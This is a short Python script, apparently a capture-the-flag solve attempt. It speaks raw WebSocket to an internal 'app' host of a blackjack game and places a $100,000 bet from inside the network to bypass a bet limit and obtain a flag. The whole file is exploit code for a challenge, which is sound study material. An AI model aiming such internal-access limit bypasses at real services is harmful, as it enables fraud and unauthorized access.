import socket, base64, os, struct, json


def recv_exact(sock, n):
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet: return None
        data.extend(packet)
    return data


def send_ws(sock, msg):
    data = msg.encode('utf-8')
    l = len(data)
    h = bytearray([0x81])
    if l <= 125:
        h.append(l | 128)
    elif l <= 65535:
        h.append(126 | 128); h.extend(struct.pack('>H', l))
    else:
        h.append(127 | 128); h.extend(struct.pack('>Q', l))
    m = os.urandom(4)
    h.extend(m)
    sock.sendall(h + bytearray(data[i] ^ m[i % 4] for i in range(l)))


def recv_ws(sock):
    h = recv_exact(sock, 2)
    if not h: return None
    l = h[1] & 127
    if l == 126:
        l = struct.unpack('>H', recv_exact(sock, 2))[0]
    elif l == 127:
        l = struct.unpack('>Q', recv_exact(sock, 8))[0]
    return recv_exact(sock, l).decode('utf-8')


# Подключаемся напрямую к внутреннему хосту
host, port = 'app', 80
key = base64.b64encode(os.urandom(16)).decode()
req = f"GET / HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"

print("[*] Подключаемся к внутреннему серверу app:80...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.sendall(req.encode())
print("[+] Handshake:", s.recv(1024).decode().split('\n')[0])

send_ws(s, json.dumps({"type": "join"}))

while True:
    resp = recv_ws(s)
    if not resp: break
    msg = json.loads(resp)

    # Чтобы не засорять экран, выводим только важные сообщения
    if msg.get("type") not in ["shuffle"]:
        print("[Сервер]", msg)

    if msg.get("type") == "state" and msg.get("phase") == "bet":
        print("[🚀] Отправляем админскую ставку $100,000 изнутри сети!")
        send_ws(s, json.dumps({"type": "bet", "amount": 100000}))

    elif msg.get("type") == "state" and msg.get("phase") == "action":
        print("[*] Игра началась! Делаем Stand и ждем результата...")
        send_ws(s, json.dumps({"type": "action", "move": "stand"}))

    elif msg.get("type") == "flag":
        print("\n🚩 ФЛАГ ПОЛУЧЕН:", msg.get("message"))
        break

    elif msg.get("type") == "error" and "between" in msg.get("message", ""):
        print("\n[-] Черт, лимит все еще работает, даже изнутри!")
        break